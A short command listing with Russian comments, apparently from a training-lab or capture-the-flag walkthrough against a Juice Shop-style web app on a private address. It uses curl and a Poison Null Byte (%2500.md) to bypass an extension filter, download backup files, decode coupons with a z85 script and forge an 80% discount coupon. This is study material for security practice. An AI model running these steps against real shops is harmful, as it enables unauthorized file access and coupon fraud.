# листинг FTP-директории
curl "http://172.20.0.106:3000/ftp/"

# скачивание backup напрямую (403 — фильтр расширений)
curl "http://172.20.0.106:3000/ftp/package.json.bak"

# обход фильтра через Poison Null Byte
curl "http://172.20.0.106:3000/ftp/package.json.bak%2500.md" -o package.json.bak
curl "http://172.20.0.106:3000/ftp/coupons_2013.md.bak%2500.md" -o coupons_2013.md.bak
cat coupons_2013.md.bak

# декодирование купонов (z85)
python3 ./z85.py decode-file coupons_2013.md.bak

# поддельный купон на 80% скидку
python3 ./z85.py encode OCT25-80
